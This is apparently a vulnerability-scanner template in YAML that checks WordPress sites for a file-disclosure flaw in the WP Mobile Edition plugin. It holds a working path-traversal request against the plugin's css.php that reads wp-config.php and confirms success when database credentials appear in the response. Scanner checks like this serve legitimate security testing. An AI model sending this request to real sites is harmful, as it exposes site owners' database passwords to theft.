http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - DB_NAME
    - DB_PASSWORD
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php'
id: wp-theme-mobile-edition-LFI
info:
  author: h0tak88r
  description: Wordpress Plugin WP Mobile Edition is not filtering data in GET parameter
    files in file themes/mTheme-Unus/css/css.php
  name: Wordpress Plugin WP Mobile Edition Remote File Disclosure
  reference: https://www.exploit-db.com/exploits/36733
  severity: high
  tags: wordpress,wp-plugin,lfi,rfd
